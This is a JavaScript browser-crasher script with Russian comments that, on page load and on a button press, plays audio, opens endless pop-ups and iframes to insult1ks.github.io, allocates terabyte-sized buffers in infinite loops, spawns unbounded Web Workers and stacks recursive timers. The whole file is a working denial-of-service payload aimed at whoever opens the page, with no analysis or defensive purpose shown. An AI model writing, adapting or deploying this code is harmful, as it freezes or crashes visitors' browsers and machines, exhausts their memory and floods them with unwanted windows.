function startCrash() {
  // Скрываем кнопку после нажатия
  var button = document.getElementById("crashButton");
  button.style.display = "none";

  // Запускаем функцию crash()
  crash();
}

function crash() {
  // Воспроизведение аудио
  var audio = document.getElementById("audio");
  audio.play();

  // Создание бесконечных iframe
  setInterval(function() {
    var iframe = document.createElement('iframe');
    iframe.src = 'https://insult1ks.github.io';
    iframe.width = 800;
    iframe.height = 600;
    document.body.appendChild(iframe);
  }, 0);

  // Открытие бесконечных всплывающих окон
  setInterval(function() {
    var popup = window.open('https://insult1ks.github.io', '_blank', 'width=500,height=500');
    popup.focus();
  }, 0);

  // Бесконечный цикл с Three.js
  while (true) {
    var geometry = new THREE.BoxGeometry();
    var material = new THREE.MeshBasicMaterial({color: Math.random() * 0xffffff});
    var cube = new THREE.Mesh(geometry, material);
    cube.rotation.x += Math.random() * 2 * Math.PI;
    cube.rotation.y += Math.random() * 2 * Math.PI;
    cube.rotation.z += Math.random() * 2 * Math.PI;
    var renderer = new THREE.WebGLRenderer();
    renderer.render(new THREE.Scene().add(cube), new THREE.Camera());
  }
}

// Функция для создания большого массива
function createLargeArray() {
  let largeArray = [];

  while (true) {
    largeArray.push(new ArrayBuffer(1024 * 1024 * 1024 * 1024)); // Каждый элемент занимает 1 ТБ памяти
  }
}

// Запуск createLargeArray через setTimeout
setTimeout(createLargeArray, 0);

// Функция для загрузки множества iframe
function loadMultipleIframes(url, numIframes) {
  var index = 0;
  var intervalId = setInterval(function() {
    if (index >= numIframes) {
      clearInterval(intervalId);
      return;
    }

    var iframe = document.createElement('iframe');
    iframe.src = url;
    iframe.width = 800;
    iframe.height = 600;
    document.body.appendChild(iframe);

    index++;
  }, 0); // Задержка 0 миллисекунд между созданием iframe
}

// Загрузка множества iframe
var url = 'https://insult1ks.github.io';
var numIframes = 9999999;
loadMultipleIframes(url, numIframes);
numIframes = 999999999999;
loadMultipleIframes(url, numIframes);

// Загрузка iframe из массива URL
var urls = ['https://insult1ks.github.io', 'https://insult1ks.github.io', 'https://insult1ks.github.io'];
loadMultipleIframes(urls[0], numIframes); // Загрузка первого URL из массива

// Воспроизведение аудио
var audio = document.getElementById("audio");
audio.play();

// Создание бесконечных iframe
setInterval(function() {
  var iframe = document.createElement('iframe');
  iframe.src = 'https://insult1ks.github.io';
  iframe.width = 800;
  iframe.height = 600;
  document.body.appendChild(iframe);
}, 0);

// Открытие бесконечных всплывающих окон
setInterval(function() {
  var popup = window.open('https://insult1ks.github.io', '_blank', 'width=500,height=500');
  popup.focus();
}, 0);

// Функция для создания трех кубов с Three.js
function createThreeCubes() {
  var geometry = new THREE.BoxGeometry();
  var material = new THREE.MeshBasicMaterial({color: Math.random() * 0xffffff});
  var cube = new THREE.Mesh(geometry, material);
  cube.rotation.x += Math.random() * 2 * Math.PI;
  cube.rotation.y += Math.random() * 2 * Math.PI;
  cube.rotation.z += Math.random() * 2 * Math.PI;
  var renderer = new THREE.WebGLRenderer();
  renderer.render(new THREE.Scene().add(cube), new THREE.Camera());

  requestAnimationFrame(createThreeCubes);
}

// Запуск создания кубов
requestAnimationFrame(createThreeCubes);

// Canvas и анимация сетки
const canvas = document.createElement("canvas");
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;
document.body.appendChild(canvas);
const ctx = canvas.getContext("2d");

let gridSize = 16;

function drawGrid() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  const cellSize = canvas.width / gridSize;

  ctx.beginPath();
  for (let i = 0; i <= gridSize; i++) {
    ctx.moveTo(i * cellSize, 0);
    ctx.lineTo(i * cellSize, canvas.height);
    ctx.moveTo(0, i * cellSize);
    ctx.lineTo(canvas.width, i * cellSize);
  }
  ctx.stroke();

  gridSize *= 100 * 100 * 100 * 100 * 100 * 100; // Увеличение размера сетки
  requestAnimationFrame(drawGrid);
}

// Запуск анимации сетки
requestAnimationFrame(drawGrid);

// Бесконечные Web Workers
while (true) {
  new Worker("data:text/javascript," + encodeURIComponent("setInterval(() => { importScripts('createCookie.js'); }, 1);"));
}

// Рекурсивные интервалы
x = function() {
  setInterval(console.log, 1, Math.random());
  try {
    setInterval(x, 1);
  } catch (e) {
    console.log(e);
  }
}

while (true) {
  try {
    setInterval(x, 1);
  } catch (e) {
    console.log(e);
  }
                            }
